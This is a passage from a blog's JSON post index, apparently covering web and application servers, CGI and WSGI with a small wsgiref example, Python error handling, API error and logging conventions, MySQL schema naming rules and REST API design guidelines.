Application中，我们通常依赖于框架（framework）来创建我们的Web Application，比如基于 Spring、ASP.NET 或 Django 框架创建的 Web application 等等。 业务逻辑（business logic）就在Web Application中进行编写。这是因为，诸如网络连接、请求缓存、权限管理等很多功能框架本身已经帮我们 cover 了。 Conclusion狭义的Web Server（Web 服务器）概念中，Web Server只能处理静态页面。而 Application Server（应用服务器）能动态地处理HTTP 请求。 更偏向于把 Application Server和Web Server区分开来，则交互关系如下所示： 123+--------+ +------------+ +--------------------+| Client | --&gt; | Web Server | --&gt; | Application Server |+--------+ +------------+ +--------------------+ 而从广义的 CGI 的概念来说，所有能动态处理HTTP 请求的Web Server（Web 服务器）都可以称为 CGI，这其实隐式地（implicitly）这个Web Server通过 plugin 以支持脚本语言来动态地处理情况，或者内置了一个 Web Application Server。 Reference servlet的本质是什么，它是如何工作的？ - https://www.zhihu.com/question/21416727 https://blog.csdn.net/weixin_43869318/article/details/94054315 https://www.zhihu.com/question/19998865/answer/29395327 万剑归宗——CGI - https://zhuanlan.zhihu.com/p/25013398 https://en.wikipedia.org/wiki/Web_2.0 https://confluence.shopee.io/pages/viewpage.action?spaceKey=LABS&amp;title=4.1+Overview https://stackoverflow.com/questions/936197/what-is-the-difference-between-application-server-and-web-server https://en.wikipedia.org/wiki/Application_server https://en.wikipedia.org/wiki/List_of_application_servers https://docs.djangoproject.com/en/2.2/howto/deployment/wsgi/modwsgi/","comments":true,"categories":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/categories/HTTP/"},{"name":"Network","slug":"HTTP/Network","permalink":"http://swsmile.info/categories/HTTP/Network/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/tags/HTTP/"},{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Python】WSGI（Web Server Gateway Interface）、uWSGI Server、uwsgi、WSGI Application 的故事","date":"2019-10-28T08:33:02.000Z","path":"2019/10/28/【Python】WSGI/","text":"关于Web Server（Web 服务器）、Web Application Server（Web 应用服务器）和 CGI（Common Gateway Interface）的区别，可以访问【HTTP】Web Server（Web 服务器）、Web Application Server（Web 应用服务器）和 CGI（Common Gateway Interface）的故事 。 WSGI（Web Server Gateway Interface）WSGI是 Web Server Gateway Interface 的缩写。 它不是服务器、Python模块、框架、API或者任何软件，而是一种描述 Web服务器（如nginx，uWSGI等服务器）如何与Web application（Web应用程序，如用Django、Flask框架编写的程序）通信的规范。 因此，WSGI 是一种规范，或者说一种接口，或者说一种协议。 WSGI是在 PEP 333提出的，并在 PEP 3333 进行补充（主要是为了支持 Python3.x）。 这个协议旨在解决众多 Python Web 框架和Web server软件的兼容问题。有了WSGI，你不用再因为你使用特定的Web 应用框架而不得不选择特定的 Web server软件。 只要遵照了 WSGI 协议的的 Web 应用（Web application，我们称之为WSGI应用），都可以在任何遵照了WSGI协议的 Web server 软件（我们称之为 WSGI server，比如 uWSGI）上运行。 常用的 WSGI server（WSGI 服务器）软件：wsgiref，uWSGI，Gunicorn等 而对于WSGI 应用（WSGI Application），我们理论上可以完全自己从头编写一个 WSGI 应用，但是，我们通常会使用WSGI 应用框架（WSGI Application Framework），或者称为WSGI MiddleWare，比如Django，Flask等，因为框架已经帮我们封装了大量的底层逻辑，而让我们可以更好的专注于业务逻辑上。 为了更好的理解 WSGI 应用（WSGI Application），我们接下来会写一个非常原始的 WSGI 应用。 WSGI ServerWSGI server 就是一个符合 WSGI 规范的 Web server，接收request请求，封装一系列环境变量，按照 WSGI 规范调用注册的 WSGI 应用，最后将response返回给客户端。 python自带的 wsgiref 就是按照 WSGI 规范实现的一个简单 WSGI server。它的代码也不复杂。 WSGI Application（WSGI 应用）WSGI Application 就是一个普通的callable对象，当有请求到来时，WSGI server 会调用这个 WSGI Application。这个对象接收两个参数，通常为environ 和 start_response。 environ 可以理解为环境变量，跟一次请求相关的所有信息都保存在了这个环境变量中，包括服务器信息，客户端信息，请求信息。 start_response是一个callback函数，WSGI application通过调用start_response，将response headers/status 返回给WSGI server。此外这个WSGI application会return 一个iterator对象 ，这个iterator就是response body。 一个HTTP请求的过程可以分为两个阶段，第一阶段是从客户端（比如 Postman，当然也可以是浏览器）到WSGI Server，第二阶段是从WSGI Server 到WSGI Application。 WSGI Middleware有些功能可能介于 WSGI Server 和 WSGI Application 之间，例如，WSGI Server 拿到了客户端请求的URL, 不同的URL需要交由不同的函数处理，这个功能叫做 URL Routing，这个功能就可以放在二者中间实现，这个中间层就是 middleware。 middleware对 WSGI Server 和 WSGI Application 是透明的，也就是说，WSGI Server 以为它就是应用程序，而WSGI Application 以为它就是服务器。 手工实现WSGI Application为了更好的理解 WSGI 接口，我们接下来会写一个非常原始的 WSGI 应用。 WSGI 接口WSGI 接口，其实非常简单，即只要求WSGI Application 要实现一个函数，且有如下三个要求： 必须是一个可调用的对象 接收两个必选参数environ、start_response。 返回值必须是可迭代对象，用来表示http body。 Hello, web我们来看一个最简单的Web版本的“Hello, web!”： 123def application(environ, start_response): start_response('200 OK', [('Content-Type', 'text/html')]) return [b'&lt;h1&gt;Hello, web!&lt;/h1&gt;'] 分析上面的application()函数就是符合WSGI标准的一个HTTP处理函数，它接收两个参数： environ：一个包含所有HTTP请求信息的dict对象； start_response：一个发送HTTP响应的函数。 在application()函数中，调用： 1start_response('200 OK', [('Content-Type', 'text/html')]) 就发送了HTTP响应的Header，注意Header只能发送一次，也就是只能调用一次start_response()函数。start_response()函数接收两个参数，一个是HTTP响应码，一个是一组list表示的HTTP Header，每个Header用一个包含两个str的tuple表示。 通常情况下，都应该把Content-Type头发送给浏览器。其他很多常用的HTTP Header也应该发送。 然后，函数的返回值b&#39;Hello, web!&#39;将作为HTTP响应的Body发送给浏览器。 函数的调用有了WSGI，我们关心的就是如何从environ这个dict对象拿到HTTP请求信息，然后构造HTML，通过start_response()发送Header，最后返回Body。 整个application()函数本身没有涉及到任何解析HTTP的部分。而事实上，WSGI Server 会（在调用我们写的application()的时候）帮我们准备好这个 environ 对象。 因此，我们只负责在更高层次上考虑如何响应请求就可以了（i.e., 处理业务逻辑）。 函数的回调而这个application()函数会被怎么调用？如果我们自己调用，两个参数environ和start_response我们没法提供，返回的bytes也没法发给浏览器。 所以application()函数必须由 WSGI server来调用。有很多符合WSGI规范的服务器，我们可以挑选一个来用。但是现在，我们只想尽快测试一下我们编写的application()函数真的可以把HTML输出到浏览器，所以，要赶紧找一个最简单的 WSGI server，把我们的Web应用程序跑起来。 好消息是Python内置了一个WSGI server，这个模块叫wsgiref，它是用纯Python编写的WSGI server的参考实现。所谓“参考实现”是指该实现完全符合WSGI标准，但是不考虑任何运行效率，仅供开发和测试使用。 运行 WSGI Application我们先编写hello.py，实现Web应用程序的WSGI处理函数： 12345# hello.pydef application(environ, start_response): start_response('200 OK', [('Content-Type', 'text/html')]) return [b'&lt;h1&gt;Hello, web!&lt;/h1&gt;'] 然后，再编写一个server.py，负责启动WSGI server，加载application()函数： 1234567891011# server.py# 从wsgiref模块导入:from wsgiref.simple_server import make_server# 导入我们自己编写的application函数:from hello import application# 创建一个服务器，IP地址为空，端口是8000，处理函数是application:httpd = make_server('', 8000, application)print('Serving HTTP on port 8000...')# 开始监听HTTP请求:httpd.serve_forever() 确保以上两个文件在同一个目录下，然后在命令行输入python server.py来启动WSGI server。 打开浏览器，输入http://localhost:8000/，就可以看到结果了： 在命令行可以看到wsgiref打印的log信息： 1234$ python main.pyServing HTTP on port 8000...127.0.0.1 - - [28/Oct/2019 20:55:49] \"GET / HTTP/1.1\" 200 20127.0.0.1 - - [28/Oct/2019 20:55:49] \"GET /favicon.ico HTTP/1.1\" 200 20 如果你觉得这个Web应用太简单了，可以稍微改造一下，从environ里读取PATH_INFO，这样可以显示更加动态的内容： 123456# hello.pydef application(environ, start_response): start_response('200 OK', [('Content-Type', 'text/html')]) body = '&lt;h1&gt;Hello, %s!&lt;/h1&gt;' % (environ['PATH_INFO'][1:] or 'web') return [body.encode('utf-8')] 你可以在地址栏输入用户名作为URL的一部分，将返回Hello, xxx!。 WSGI MiddlewareBackground了解了WSGI框架，我们发现：其实一个Web App，就是写一个WSGI的处理函数，针对每个HTTP请求进行响应。 但是如何处理HTTP请求不是问题，问题是如何处理100个不同的URL。 每一个URL可以对应GET和POST请求，当然还有PUT、DELETE等请求，但是我们通常只考虑最常见的GET和POST请求。 一个最简单的想法是从environ变量里取出HTTP请求的信息，然后逐个判断： 12345678def application(environ, start_response): method = environ['REQUEST_METHOD'] path = environ['PATH_INFO'] if method=='GET' and path=='/': return handle_home(environ, start_response) if method=='POST' and path='/signin': return handle_signin(environ, start_response) ... 只是这么写下去代码是肯定没法维护了。 代码这么写没法维护的原因是因为WSGI提供的接口虽然比HTTP接口高级了不少，但和Web App的处理逻辑比，还是比较低级，我们需要在WSGI接口之上能进一步抽象，让我们专注于用一个函数处理一个URL，至于URL到函数的映射，就交给Web框架来做。 由于用Python开发一个Web框架十分容易，所以Python有上百个开源的Web框架，比如 Flask。 WSGI Middleware我们可以通过下图来说明middleware是如何工作的： 上图中最上面的三个彩色框表示角色，中间的白色框表示操作，操作的发生顺序按照1 ~ 5进行了排序，我们直接对着上图来说明middleware是如何工作的： Server收到客户端的HTTP请求后，生成了environ_s，并且已经定义了start_response_s。 Server调用Middleware的application对象，传递的参数是environ_s和start_response_s。 Middleware会根据environ执行业务逻辑，生成environ_m，并且已经定义了start_response_m。 Middleware决定调用Application的application对象，传递参数是environ_m和start_response_m。Application的application对象处理完成后，会调用start_response_m并且返回结果给Middleware，存放在result_m中。 Middleware处理result_m，然后生成result_s，接着调用start_response_s，并返回结果result_s给Server端。Server端获取到result_s后就可以发送结果给客户端了。 从上面的流程可以看出middleware应用的几个特点： Server认为middleware是一个application。 Application认为middleware是一个server。 Middleware可以有多层。 因为Middleware能过处理所有经过的request和response，所以要做什么都可以，没有限制。比如可以检查request是否有非法内容，检查response是否有非法内容，为request加上特定的HTTP header等，这些都是可以的。 WSGI参数environ参数environ参数是一个Python的字典，里面存放了所有和客户端相关的信息，这样application对象就能知道客户端请求的资源是什么，请求中带了什么数据等。environ字典包含了一些CGI规范要求的数据，以及WSGI规范新增的数据，还可能包含一些操作系统的环境变量以及Web服务器相关的环境变量。我们来看一些environ中常用的成员： 首先是CGI规范中要求的变量： REQUEST_METHOD： 请求方法，是个字符串，’GET’, ‘POST’等 SCRIPT_NAME： HTTP请求的path中的用于查找到application对象的部分，比如Web服务器可以根据path的一部分来决定请求由哪个virtual host处理 PATH_INFO： HTTP请求的path中剩余的部分，也就是application要处理的部分 QUERY_STRING： HTTP请求中的查询字符串，URL中?后面的内容 CONTENT_TYPE： HTTP headers中的content-type内容 CONTENT_LENGTH： HTTP headers中的content-length内容 SERVER_NAME和SERVER_PORT： 服务器名和端口，这两个值和前面的SCRIPT_NAME, PATH_INFO拼起来可以得到完整的URL路径 SERVER_PROTOCOL： HTTP协议版本，HTTP/1.0或者HTTP/1.1 HTTP_： 和HTTP请求中的headers对应。 WSGI规范中还要求environ包含下列成员： wsgi.version：表示WSGI版本，一个元组(1, 0)，表示版本1.0 wsgi.url_scheme：http或者https wsgi.input：一个类文件的输入流，application可以通过这个获取HTTP request body wsgi.errors：一个输出流，当应用程序出错时，可以将错误信息写入这里 wsgi.multithread：当application对象可能被多个线程同时调用时，这个值需要为True wsgi.multiprocess：当application对象可能被多个进程同时调用时，这个值需要为True wsgi.run_once：当server期望application对象在进程的生命周期内只被调用一次时，该值为True 上面列出的这些内容已经包括了客户端请求的所有数据，足够application对象处理客户端请求了。 start_resposne参数start_response是一个可调用对象，接收两个必选参数和一个可选参数： status: 一个字符串，表示HTTP响应状态字符串 response_headers: 一个列表，包含有如下形式的元组：(header_name, header_value)，用来表示HTTP响应的headers exc_info（可选）: 用于出错时，server需要返回给浏览器的信息 当application对象根据environ参数的内容执行完业务逻辑后，就需要返回结果给server端。我们知道HTTP的响应需要包含status，headers和body，所以在application对象将body作为返回值return之前，需要先调用start_response()，将status和headers的内容返回给server，这同时也是告诉server，application对象要开始返回body了。 application对象的返回值application对象的返回值用于为HTTP响应提供body，如果没有body，那么可以返回None。如果有body的化，那么需要返回一个可迭代的对象。server端通过遍历这个可迭代对象可以获得body的全部内容。 uWSGI服务器uWSGI是一个全功能的HTTP服务器，实现了WSGI协议、uwsgi协议、HTTP协议等。它要做的就是把HTTP协议转化成语言支持的网络协议。比如把HTTP协议转化成WSGI协议，让Python可以直接使用。 在 Java 的世界中，servlet 容器会基于 servlet 接口向其内部运行的 servlet application 转发HTTP请求，当servlet application处理完成后，servlet 容器将HTTP Reponse 返回给 Client。 其实，uWSGI服务器对应于实现了 servlet接口的 Tomcat 或者 Jetty。 uwsgi协议与WSGI一样，uwsgi是一个uWSGI服务器自有通信协议，用于定义传输信息的类型(type of information)。每一个uwsgi packet前4byte为传输信息类型的描述，与WSGI协议是两种东西。 WSGI 的支持般常用的Web服务器，如Apache和nginx，都不会内置WSGI的支持，而是通过扩展来完成。比如Apache服务器，会通过扩展模块mod_wsgi来支持WSGI。Apache和mod_wsgi之间通过程序内部接口传递信息，mod_wsgi会实现WSGI的server端、进程管理以及对application的调用。Nginx上一般是用proxy的方式，用nginx的协议将请求封装好，发送给应用服务器，比如uWSGI，应用服务器会实现WSGI的服务端、进程管理以及对application的调用。 Reference https://uwsgi-docs.readthedocs.io/en/latest/# 网关协议学习：CGI、FastCGI、WSGI - https://www.biaodianfu.com/cgi-fastcgi-wsgi.html WSGI接口 - https://www.liaoxuefeng.com/wiki/1016959663602400/1017805733037760 花了两个星期，我终于把 WSGI 整明白了 - https://juejin.im/post/5cff300a6fb9a07ef06f8a43 PEP-3333 https://segmentfault.com/a/1190000003069785","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Error Handling","date":"2019-10-28T08:12:07.000Z","path":"2019/10/28/【Python】Error-Handling/","text":"Error ReturnIf service can not handle request for internal error or upstream error, it should response proper error information to client. Service should write log for every error return. The error response structure should be consistent for all APIs in one service. The error code should be either a short string code or an integer, defined by service. This is to help client understand the situation and choose different ways to handle the error. The detailed error message is optional. This is to help client debug the issue. The error code need to be categorized to 2 types, and allow client side easily identify the type of error. Occasional error, such as upstream down, internal error, etc. This kind of errors means client can safely retry the request. Logic error, such as invalid argument. Client can cached the result and should not directly retry the request. Error HandlingIf your service depends on other services, such as database, redis, API server, the service may get error from upstream service. The upstream request need to be wrapped in a function, there are 3 ways to return error from this function. This is suggested to be consistent in one project. (Recommended) Return error code and response data as tuple. 1`error, data = request_api_server(request)``if` `error is not None:`` ``log.error(``'request_api_server_error|error=%s,request=%s'``, error, request)`` ``return` `error``return` `data` Return response data only, and if request failed, return null value. This is only applicable for non-critical request. 1`data = request_api_server(request)``if` `data is None:`` ``log.error(``'request_api_server_error|request=%s'``, request)`` ``return` `'error_unknown'``return` `data` Return response data, raise exception if request failed. 1`try``:`` ``data = request_api_server(request)``except Exception as ex:`` ``log.error(``'request_api_server_error|error=%s,request=%s'``, ex, request)`` ``return` `ex``return` `data` If the error code is inside the response data body, the wrapped function need to extract the error code and return error in one of above ways. Every time calling upstream request function, you need to check and handle error properly. There are 3 types of errors when calling upstream service, and need to be handle in different ways: Any error from idempotent API, service can retry for several times. Occasional errors from upstream, such as internal error, service can retry for several times. Non-occasional errors from upstream, such as invalid argument, lost connection, etc., service should not directly retry the request. Every time you receive a error from upstream, you should log the error information and context. 1`get_user_query_db_error|error=lost_connection,uid=``10000``,sql=SELECT * FROM user_tab WHERE uid=``10000``get_user_query_api_server_error|error=invalid_argument,cmd=gete_user,uid=``10000` If service needs to retry request, it should properly decide the retry delay for different kind of errors, and should have a maximum retry times limit. If you can not get successful response from upstream service, you need to properly handle the error: 1) recover from the errors; 2) propagate errors. If the upstreaming request is not a critical path in current request, you can log the errors and continue handling the request without making the request failed. The service should not blindly propagate errors from those services to your clients. When translating errors, we suggest the following: Hide implementation details and confidential information. Adjust the party responsible for the error. For example, a server that receives an INVALID_ARGUMENT error from another service should propagate an INTERNAL to its own caller. Reference Server Error Handling Guide - https://confluence.shopee.io/display/LABS/Server+Error+Handling+Guide","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Architecture】Design - Error Handling","date":"2019-10-28T08:02:15.000Z","path":"2019/10/28/【Architecture】Design-Error-Handling/","text":"Error CodesGoogle APIs must use the canonical error codes defined by google.rpc.Code. Individual APIs should avoid defining additional error codes, since developers are very unlikely to write logic to handle a large number of error codes. For reference, handling an average of 3 error codes per API call would mean most application logic would just be for error handling, which would not be a good developer experience. Error MessagesThe error message should help users understand and resolve the API error easily and quickly. In general, consider the following guidelines when writing error messages: Do not assume the user is an expert user of your API. Users could be client developers, operations people, IT staff, or end-users of apps. Do not assume the user knows anything about your service implementation or is familiar with the context of the errors (such as log analysis). When possible, error messages should be constructed such that a technical user (but not necessarily a developer of your API) can respond to the error and correct it. Keep the error message brief. If needed, provide a link where a confused reader can ask questions, give feedback, or get more information that doesn’t cleanly fit in an error message. Otherwise, use the details field to expand. Error DetailsGoogle APIs define a set of standard error payloads for error details, which you can find in google/rpc/error_details.proto. These cover the most common needs for API errors, such as quota failure and invalid parameters. Like error codes, error details should use these standard payloads whenever possible. Additional error detail types should only be introduced if they can assist application code to handle the errors. If the error information can only be handled by humans, rely on the error message content and let developers handle it manually rather than introducing new error detail types. LoggingLog FormatWe suggest the log format as follow, to make sure it is easy for programs to parse it. 1key_words|key1=value1,key2=value2,key3=value3…… Here are some examples, the gray text was automatically generated by logger C++: 12013-04-08 15:30:42.621|FATAL|0x7f865e4b9720|GdpProcessor.cpp(35)|CGdpPrcessor::Init|init_db_client_fail|id=95,db=gpp_db,type=1 Python: 12014-07-30 17:47:27.358|WARNING|544:3108|beepay_processor.py:122|beepay_processor.on_packet|process_request_no_session|client=0.0.0.0:0(0),cmd=2175 Log Level Trace - Only when I would be “tracing” the code and trying to find one part of a function specifically. Debug - Information that is diagnostically helpful to people more than just developers (IT, sysadmins, etc.). Info - Generally useful information to log (service start/stop, configuration assumptions, etc). Info I want to always have available but usually don’t care about under normal circumstances. This is my out-of-the-box config level. Warn - Anything that can potentially cause application oddities, but for which I am automatically recovering. (Such as switching from a primary to backup server, retrying an operation, missing secondary data, etc.) Error - Any error which is fatal to the operation, but not the service or application (can’t open a required file, missing data, etc.). These errors will force user (administrator, or direct user) intervention. These are usually reserved (in my apps) for incorrect connection strings, missing services, etc. Fatal - Any error that is forcing a shutdown of the service or application to prevent data loss (or further data loss). I reserve these only for the most heinous errors and situations where there is guaranteed to have been data corruption or loss. Reference https://cloud.google.com/apis/design/errors https://confluence.shopee.io/pages/viewpage.action?spaceKey=LABS&amp;title=Server+Error+Handling+Guide","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"},{"name":"ArchitectureDesign","slug":"Architecture/ArchitectureDesign","permalink":"http://swsmile.info/categories/Architecture/ArchitectureDesign/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"},{"name":"ArchitectureDesign","slug":"ArchitectureDesign","permalink":"http://swsmile.info/tags/ArchitectureDesign/"}]},{"title":"【Architecture】Design - Database Schema Design","date":"2019-10-28T07:57:56.000Z","path":"2019/10/28/【Architecture】Design-Database-Schema-Design/","text":"Naming DB lower_case_with_underscores with suffix _db. e.g. account_db, company_account_db, gop_txn_db, company_admin_vn_db Use project code as the prefix.e.g. company_account_db, gop_txn_db If the database is specific for a region, add region code before _db. e.g. company_admin_vn_db For sharding db, put shard id as suffix after _db, padding to 8 digits, started from 0.e.g. company_account_db_00000000, gop_txn_db_00001000, log_db_00002018 Table lower_case_with_underscores with suffix _tab. e.g. user_tab For sharding table, put shard id as suffix after _tab, padding to 8 digits, started from 0.e.g. account_tab_00000000, order_tab_00001000, login_log_tab_00201801, audit_log_tab_20180101 Field lower_case_with_underscores. e.g. order_id, create_time If the field is a foreign reference to another table, and it is referencing an integer primary key, it should be suffixed with _id Index lower_case_with_underscores, joined keys with prefix idx_. e.g. idx_order_id, idx_key1_key2 Stored Procedure lower_case_with_underscores with prefix sp_. e.g. sp_execute_topup Function lower_case_with_underscores with prefix func_. e.g. func_get_uid Avoid from using any MySQL keywords or reserved words for db / table / field / index names. e.g. don’t use type as field name, can use user_type instead. Only use English for naming and comment, avoid to use non-English characters. Table table collate use utf8mb4_unicode_ci (recommended) or latin1_general_ci (only for special cases) use *_cs in field if this field require case sensitive collation If primary key is not sequential in design, and the data will not be deleted frequently, create another primary key 1(`id` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT) This includes composite PKs. Reason is to reduce disk I/O for InnoDB. Note: this is not applicable to TiDB. TiDB is not suggested to use auto increment id as primary key. Don’t use foreign key. MySQL foreign key implementation is quite simple and crude, and its performance is not good It is not recommended to place any computation logic onto MySQL. We take MySQL as backend storage and won’t allow foreign keys or stored routines. If our applications rely on the computation logic running on MySQL server, it will be much more difficult for us to do database/table sharding. Field Define ID value as BIGINT unsigned if possible. Numeric value that does not lose precision (such as INT, DECIMAL) is preferred over precision-loss types (such as FLOAT, DOUBLE). Define numerical value as unsigned if possible. Don’t allow NULL unless necessary. Don’t use ENUM type. Don’t set default value unless necessary. Default value is recommended when adding new fields on existing tables to ensure smooth upgrade/rollback. Use INT UNSIGNED (UNIX timestamp) instead of DATETIME to save time value. For adding column ALTER TABLE ADD COLUMN, should not indicate the location of it (FIRST / AFTER), and instead, the new column will be only appended as the last Reference","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"},{"name":"ArchitectureDesign","slug":"Architecture/ArchitectureDesign","permalink":"http://swsmile.info/categories/Architecture/ArchitectureDesign/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"},{"name":"ArchitectureDesign","slug":"ArchitectureDesign","permalink":"http://swsmile.info/tags/ArchitectureDesign/"}]},{"title":"【Architecture】Design - API Design","date":"2019-10-28T05:01:26.000Z","path":"2019/10/28/【Architecture】Design-API-Design/","text":"HTTP REST APIsURLExampleThe following sections present a few real world examples on how to apply resource-oriented API design to large scale services. You can find more examples in the Google APIs repository. In these examples, the asterisk indicates one specific resource out of the list. Gmail APIThe Gmail API service implements the Gmail API and exposes most of Gmail functionality. It has the following resource model: API service: 12345678910111213141516171819202122232425 - A collection of users:```users/*```. Each user has the following resources. - A collection of messages: `users/*/messages/*`. - A collection of threads: `users/*/threads/*`. - A collection of labels: `users/*/labels/*`. - A collection of change history: `users/*/history/*`. - A resource representing the user profile: `users/*/profile`. - A resource representing user settings: `users/*/settings`.#### Cloud Pub/Sub APIThe `pubsub.googleapis.com` service implements the [Cloud Pub/Sub API](https://cloud.google.com/pubsub), which defines the following resource model:- API service:`pubsub.googleapis.com` - A collection of topics: `projects/*/topics/*`.- A collection of subscriptions: `projects/*/subscriptions/*`.**NOTE:** Other implementations of the Pub/Sub API may choose different resource naming schemes.#### Cloud Spanner APIThe `spanner.googleapis.com` service implements the [Cloud Spanner API](https://cloud.google.com/spanner), which defines the following resource model:- API service:```spanner.googleapis.com A collection of instances:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768 - A collection of instance operations: `projects/*/instances/*/operations/*`. - A collection of databases: `projects/*/instances/*/databases/*`. - A collection of database operations: `projects/*/instances/*/databases/*/operations/*`. - A collection of database sessions: `projects/*/instances/*/databases/*/sessions/*`.&lt;!-- more --&gt; ## MethodsThe following table describes how to map standard methods to HTTP methods:| Standard Method | HTTP Mapping | HTTP Request Body | HTTP Response Body || :----------------------------------------------------------- | :-------------- | :---------------- | :------------------------ || [`List`](https://cloud.google.com/apis/design/standard_methods#list) | `GET ` | N/A | Resource* list || [`Get`](https://cloud.google.com/apis/design/standard_methods#get) | `GET ` | N/A | Resource* || [`Create`](https://cloud.google.com/apis/design/standard_methods#create) | `POST ` | Resource | Resource* || [`Update`](https://cloud.google.com/apis/design/standard_methods#update) | `PUT or PATCH ` | Resource | Resource* || [`Delete`](https://cloud.google.com/apis/design/standard_methods#delete) | `DELETE ` | N/A | `google.protobuf.Empty`** |*The resource returned from `List`, `Get`, `Create`, and `Update` methods **may** contain partial data if the methods support response field masks, which specify a subset of fields to be returned. In some cases, the API platform natively supports field masks for all methods.### ListThe `List` method takes a collection name and zero or more parameters as input, and returns a list of resources that match the input.`List` is commonly used to search for resources. `List` is suited to data from a single collection that is bounded in size and not cached. For broader cases, the [custom method](https://cloud.google.com/apis/design/custom_methods) `Search` **should** be used.A batch get (such as a method that takes multiple resource IDs and returns an object for each of those IDs) **should** be implemented as a custom `BatchGet` method, rather than a `List`. However, if you have an already-existing `List` method that provides the same functionality, you **may** reuse the `List` method for this purpose instead. If you are using a custom `BatchGet` method, it **should** be mapped to `HTTP GET`.HTTP mapping:- The `List` method **must** use an HTTP `GET` verb.- The request message field(s) receiving the name of the collection whose resources are being listed **should** map to the URL path. If the collection name maps to the URL path, the last segment of the URL template (the [collection ID](https://cloud.google.com/apis/design/resource_names#CollectionId)) **must** be literal.- All remaining request message fields **shall** map to the URL query parameters.- There is no request body; the API configuration **must not** declare a `body` clause.- The response body **should** contain a list of resources along with optional metadata.### GetThe `Get` method takes a resource name, zero or more parameters, and returns the specified resource.HTTP mapping:- The `Get` method **must** use an HTTP `GET` verb.- The request message field(s) receiving the resource name **should** map to the URL path.- All remaining request message fields **shall** map to the URL query parameters.- There is no request body; the API configuration **must not** declare a `body` clause.- The returned resource **shall** map to the entire response body.### Create### Update### Delete### Custom MethodsCustom methods refer to API methods besides the 5 standard methods. They **should** only be used for functionality that cannot be easily expressed via standard methods. In general, API designers **should** choose standard methods over custom methods whenever feasible. Standard Methods have simpler and well-defined semantics that most developers are familiar with, so they are easier to use and less error prone. Another advantage of standard methods is the API platform has better understanding and support for standard methods, such as billing, error handling, logging, monitoring.A custom method can be associated with a resource, a collection, or a service. It **may** take an arbitrary request and return an arbitrary response, and also supports streaming request and response.#### URLFor custom methods, they **should** use the following generic HTTP mapping: https://service.name/v1/some/resource/name:customVerb 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596The reason to use `:` instead of `/` to separate the custom verb from the resource name is to support arbitrary paths. For example, undelete a file can map to `POST /files/a/long/file/name:undelete`#### Use CasesSome additional scenarios where custom methods may be the right choice:- **Reboot a virtual machine.** The design alternatives could be &quot;create a reboot resource in collection of reboots&quot; which feels disproportionately complex, or &quot;virtual machine has a mutable state which the client can update from RUNNING to RESTARTING&quot; which would open questions as to which other state transitions are possible. Moreover, reboot is a well-known concept that can translate well to a custom method which intuitively meets developer expectations.- **Send mail.** Creating an email message should not necessarily send it (draft). Compared to the design alternative (move a message to an &quot;Outbox&quot; collection) custom method has the advantage of being more discoverable by the API user and models the concept more directly.- **Promote an employee.** If implemented as a standard `update`, the client would have to replicate the corporate policies governing the promotion process to ensure the promotion happens to the correct level, within the same career ladder etc.## Standard FieldsThis section describes a set of standard message field definitions that should be used when similar concepts are needed. This will ensure the same concept has the same name and semantics across different APIs.| Name | Type | Description || :---------------- | :----------------------------------------------------------- | :----------------------------------------------------------- || `name` | `string` | The `name` field should contain the [relative resource name](https://cloud.google.com/apis/design/resource_names#relative_resource_name). || `parent` | `string` | For resource definitions and List/Create requests, the `parent` field should contain the parent [relative resource name](https://cloud.google.com/apis/design/resource_names#relative_resource_name). || `create_time` | [`Timestamp`](https://github.com/google/protobuf/blob/master/src/google/protobuf/timestamp.proto) | The creation timestamp of an entity. || `update_time` | [`Timestamp`](https://github.com/google/protobuf/blob/master/src/google/protobuf/timestamp.proto) | The last update timestamp of an entity. Note: update_time is updated when create/patch/delete operation is performed. || `delete_time` | [`Timestamp`](https://github.com/google/protobuf/blob/master/src/google/protobuf/timestamp.proto) | The deletion timestamp of an entity, only if it supports retention. || `expire_time` | [`Timestamp`](https://github.com/google/protobuf/blob/master/src/google/protobuf/timestamp.proto) | The expiration timestamp of an entity if it happens to expire. || `start_time` | [`Timestamp`](https://github.com/google/protobuf/blob/master/src/google/protobuf/timestamp.proto) | The timestamp marking the beginning of some time period. || `end_time` | [`Timestamp`](https://github.com/google/protobuf/blob/master/src/google/protobuf/timestamp.proto) | The timestamp marking the end of some time period or operation (regardless of its success). || `read_time` | [`Timestamp`](https://github.com/google/protobuf/blob/master/src/google/protobuf/timestamp.proto) | The timestamp at which a particular an entity should be read (if used in a request) or was read (if used in a response). || `time_zone` | `string` | The time zone name. It should be an [IANA TZ](http://www.iana.org/time-zones) name, such as &quot;America/Los_Angeles&quot;. For more information, see https://en.wikipedia.org/wiki/List_of_tz_database_time_zones. || `region_code` | `string` | The Unicode country/region code (CLDR) of a location, such as &quot;US&quot; and &quot;419&quot;. For more information, see http://www.unicode.org/reports/tr35/#unicode_region_subtag. || `language_code` | `string` | The BCP-47 language code, such as &quot;en-US&quot; or &quot;sr-Latn&quot;. For more information, see http://www.unicode.org/reports/tr35/#Unicode_locale_identifier. || `mime_type` | `string` | An IANA published MIME type (also referred to as media type). For more information, see https://www.iana.org/assignments/media-types/media-types.xhtml. || `display_name` | `string` | The display name of an entity. || `title` | `string` | The official name of an entity, such as company name. It should be treated as the formal version of `display_name`. || `description` | `string` | One or more paragraphs of text description of an entity. || `filter` | `string` | The standard filter parameter for List methods. || `query` | `string` | The same as `filter` if being applied to a search method (ie [`:search`](https://cloud.google.com/apis/design/custom_methods#common_custom_methods)) || `page_token` | `string` | 